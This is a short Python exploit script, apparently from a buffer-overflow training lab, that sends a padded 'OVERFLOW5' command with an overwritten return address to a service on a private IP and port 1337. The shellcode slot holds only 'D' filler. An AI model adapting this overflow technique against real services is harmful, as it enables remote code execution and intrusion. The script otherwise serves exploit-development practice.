#!/usr/bin/python
import socket

#56526683
buffer = "A" * 314 + "\xAF\x11\x50\x62"
shell = "D" * 16

payload = buffer + shell

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.104.107',1337))
s.send(("OVERFLOW5 " + payload))
s.close()



